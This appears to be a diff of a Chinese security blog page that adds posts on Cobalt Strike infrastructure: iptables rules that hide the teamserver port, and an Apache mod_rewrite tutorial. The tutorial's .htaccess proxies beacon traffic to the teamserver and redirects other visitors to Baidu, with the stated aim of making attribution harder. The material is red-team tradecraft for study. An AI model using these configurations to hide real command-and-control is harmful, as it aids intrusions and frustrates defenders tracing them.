+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT  -p tcp --dport 8880 -j DROP</span><br><span class="line">iptables -A INPUT -s xxx.xxx.xxx.xx -p tcp --dport 8880 -j ACCEPT</span><br><span class="line">iptables -L -n --line-number  </span><br><span class="line">iptables-save</span><br></pre></td></tr></table></figure>
+
+<p>​        设置好以后再使用其他的主机去访问我们teamserver的8880端口已经无法访问了。</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908193828070.png" alt="image-20200908193828070"></p>
+<p>​        但是我们的beacon还可以正常运行</p>
+<p><img src="/2020/09/08/%E8%AE%B0%E5%9F%BA%E4%BA%8Ecobaltstrike%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1%E5%B0%9D%E8%AF%95/image-20200908194108753.png" alt="image-20200908194108753"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
+    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="藏青">
+      <meta itemprop="description" content="知行合一">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="藏青's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">关于Mod_Rewrite重定向cobaltstrike流量的学习总结</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-09-04 17:20:35" itemprop="dateCreated datePublished" datetime="2020-09-04T17:20:35+08:00">2020-09-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-08 11:11:54" itemprop="dateModified" datetime="2020-09-08T11:11:54+08:00">2020-09-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
+                    <span itemprop="name">cobaltstrike</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>​        通过使用socat进行重定向虽然可以将我们的teamserver隐藏起来，但是我们如果想做的更好一些，对请求我们重定向主机的流量做一个区分，如果请求来自客户端则重定向到teamserver，如果请求来自其他请求则重定向到其他网站。或者在请求中设置白名单，仅仅允许来自某个特定的ip来访问。这就需要通过apache 的Mod_rewrite来实现。</p>
+<h3 id="mod-rewrite入门"><a href="#mod-rewrite入门" class="headerlink" title="mod_rewrite入门"></a>mod_rewrite入门</h3><p><strong>什么是mod_rewrite？</strong></p>
+<p>​        mod_rewrite是Apache的一个模块，此模块提供了一个基于正则表达式分析器的重写引擎来实时重写URL请求。它支持每个完整规则可以拥有不限数量的子规则以及附加条件规则的灵活而且强大的URL操作机制。此URL操作可以依赖于各种测试，比如服务器变量、环境变量、HTTP头、时间标记，甚至各种格式的用于匹配URL组成部分的查找数据库。 –<a href="https://my.oschina.net/u/2326780/blog/385304" target="_blank" rel="noopener">mod_rewrite模块作用介绍</a></p>
+<p>​         此模块可以操作URL的所有部分(包括路径信息部分)，在服务器级的(httpd.conf)和目录级的(.htaccess)配置都有效，还可以生成最终请求字符串。此重写操作的结果可以是内部子处理，也可以是外部请求的转向，甚至还可以是内部代理处理。<strong>一般mod_rewrite默认是不启动的，这时我们需要手动启用它</strong>  –<a href="https://my.oschina.net/u/2326780/blog/385304" target="_blank" rel="noopener">mod_rewrite模块作用介绍</a></p>
+<p><strong>怎么使用mod_rewrite？</strong></p>
+<p>​        首先安装apache</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install httpd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200904183349947.png" alt="image-20200904183349947"></p>
+<p>​        安装好以后，查看是否开启mod_rewrite模块,在下面的路径下，我们可以看到我这里默认已经开启了这个模块。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf.modules.d&#x2F;00-base.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907092649577.png" alt="image-20200907092649577"></p>
+<p>​        也可以使用下面的命令检查是否开启,如果能在输出中找到rewrite_module，则说明开启成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpd -M</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907095113772.png" alt="image-20200907095113772"></p>
+<p>​        然后我们需要开启.htaccess的支持，找到/etc/httpd/conf/httpd.conf文件，找到下面的内容，将AllowOverride None 替换为AllowOverride All,注意，这里的<strong>Directory是/var/www/html</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot; &#x2F;var&#x2F;www&#x2F;html&quot;&gt;</span><br><span class="line">....</span><br><span class="line">    AllowOverride None  &#x2F;&#x2F;替换为AllowOverride All</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;&#x2F;Directory&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​        设置好以后启动apache服务,再访问一下看是否开启成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service httpd start</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907092757010.png" alt="image-20200907092757010"></p>
+<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907092849077.png" alt="image-20200907092849077"></p>
+<p>​    开启后我们在/var/www/html/下编写一个2.html文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">2.html</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​        再编写一个.htaccess文件，文件内容如下，我大概先解释一下里面的语法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine on   </span><br><span class="line">RewriteRule 1.html 2.html</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​        RewriteEngine on,RewriteEngine 是rewrite功能的总开关，用来开启是否启动url rewrite。</p>
+<p>​        RewriteRule 是指令允许我们基于URL将请求重新映射到Apache。一个<code>.htaccess</code>文件可以容纳多个重写规则，但在运行时，Apache按照定义的顺序应用规则。RewriteRule的语法规则如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule Pattern Substitution [Flags]</span><br></pre></td></tr></table></figure>
+
+<p>​        Pattern需要匹配的字符串，Substitution替换为其他的url</p>
+<p>​        编写好以后我们测试一下，访问1.html，实际上这个文件是不存在的，但是经过.htaccess的RewriteRule规则，我们访问到了2.html的内容</p>
+<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907102919483.png" alt="image-20200907102919483"></p>
+<p>​        最后，我们再介绍一个关于mod_rewrite的语法:RewriteCond。</p>
+<p>​        <code>RewriteCond</code>指令允许我们为重写规则添加条件。重写条件包括以下结构：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule TestString  Condition  [Flags]</span><br></pre></td></tr></table></figure>
+
+<p>​        TestString:要测试的字符串，Condition：匹配的模式,flag如果是NC则代表忽略大小写的匹配</p>
+<p>​        这样可能不好理解，我们通过一些实例来帮助我们理解,我们再设置一个.htaccess文件，内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_USER_AGENT&#125;&quot; &quot;test666&quot; [NC]</span><br><span class="line">RewriteRule 1.html 2.html</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​        当我们使用上面的.htaccess后，我们直接通过浏览器去访问1.html文件，会显示文件不存在，也就是说RewriteRule这个规则没有生效。</p>
+<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907103945803.png" alt="image-20200907103945803"></p>
+<p>​        我们尝试抓包将user_agent部分修改为test666，这样就可以正常访问到。也就是说规则生效了。</p>
+<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907104222145.png" alt="image-20200907104222145"></p>
+<p>案例一：根据referer来进行筛选</p>
+<p>​        .htaccess文件内容如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine on</span><br><span class="line">RewriteCond &quot;%&#123;HTTP_REFERER&#125;&quot; &quot;test666.com&quot; [NC]</span><br><span class="line">RewriteRule 1.html 2.html</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​        直接访问1.html仍然访问不到</p>
+<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907104525076.png" alt="image-20200907104525076"></p>
+<p>​        通过添加referer内容为test666.com则可以正常访问到</p>
+<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907104621874.png" alt="image-20200907104621874"></p>
+<h3 id="mod-rewrite重定向cobaltstrike"><a href="#mod-rewrite重定向cobaltstrike" class="headerlink" title="mod_rewrite重定向cobaltstrike"></a>mod_rewrite重定向cobaltstrike</h3><p>​        根据目标访问的目录不同来进行重定向操作，只有当目标访问到某个特定的地址时，将流量重定向到我们的teamserver，将其他的流量重定向到百度。</p>
+<p>​        我这里cobaltstrike流量这里还是以github上开源的msu_edu.profile的流量来进行配置。我们主要关注下get和post请求部分的url。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set uri &quot;&#x2F;siteindex&#x2F;a&#x2F; &#x2F;siteindex&#x2F;b&#x2F; &#x2F;siteindex&#x2F;c&#x2F;&quot;;  &#x2F;&#x2F;get请求部分</span><br><span class="line"> set uri &quot;&#x2F;getsearchresults&quot;;   &#x2F;&#x2F;post部分</span><br><span class="line">set uri_x86 &quot;&#x2F;Events&quot;;  &#x2F;&#x2F;stager部分</span><br><span class="line">set uri_x64 &quot;&#x2F;events&quot;   &#x2F;&#x2F;stager部分</span><br></pre></td></tr></table></figure>
+
+<p>​        好的，得到了这个以后我们在重定向的那台主机上设置.htaccess的规则,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteCond %&#123;REQUEST_URI&#125; ^&#x2F;(siteindex&#x2F;a&#x2F;|siteindex&#x2F;c&#x2F;|siteindex&#x2F;c&#x2F;|getsearchresults|Events|events)&#x2F;?$</span><br><span class="line">RewriteRule ^.*$ http:&#x2F;&#x2F;teamserver-ip:8080%&#123;REQUEST_URI&#125; [P]</span><br><span class="line">RewriteRule ^.*$ https:&#x2F;&#x2F;www.baidu.com&#x2F;? [L,R&#x3D;302]</span><br></pre></td></tr></table></figure>
+
+<p>​        设置好以后我们在cobaltstrike中创建一个listener,地址填入重定向主机的地址，这里需要注意，http port(C2)的端口需要和重定向主机apache的端口一致。apache的端口修改在/etc/httpd/conf/httpd.conf中,修改后重启apache服务即可。</p>
+<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907151628805.png" alt="image-20200907151628805"></p>
+<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907115815700.png" alt="image-20200907115815700"></p>
+<p>​        设置好以后我们生成一个shell看下能否正常上线并执行命令</p>
+<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907151750637.png" alt="image-20200907151750637"></p>
+<p>​        <img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907151845447.png" alt="image-20200907151845447"></p>
+<p>​        但是我们直接去访问重定向的那台主机，如果加入其他路径是无法访问成功的。</p>
+<p><img src="/2020/09/04/%E5%85%B3%E4%BA%8EMod-Rewrite%E9%87%8D%E5%AE%9A%E5%90%91cobaltstrike%E6%B5%81%E9%87%8F%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200907152105597.png" alt="image-20200907152105597"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​        通过上面的学习，我们了解了如何通过mod_rewrite的规则设置来进行流量的控制，通过这种方法可以进行访问控制，从而在一定程度上提升溯源的难度。也可以通过https来设置重定向，这样抓到的流量也看不到具体的路径信息。我们也可以给前置服务器加上CDN，这样也可以在一定层面上增加溯源的难度。</p>
+<p><strong>参考文章</strong></p>
+<p><a href="https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/" target="_blank" rel="noopener">Cobalt Strike HTTP C2 Redirectors with Apache mod_rewrite</a></p>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/CIA-Hive-Beacon-Infrastructure%E5%A4%8D%E7%8E%B01-%E4%BD%BF%E7%94%A8Apache-mod_rewrite%E5%AE%9E%E7%8E%B0http%E6%B5%81%E9%87%8F%E5%88%86%E5%8F%91/" target="_blank" rel="noopener">CIA Hive Beacon Infrastructure复现1——使用Apache mod_rewrite实现http流量分发</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
   </div>
 
   
@@ -2053,7 +2192,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-count">31</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2066,7 +2205,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-count">16</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
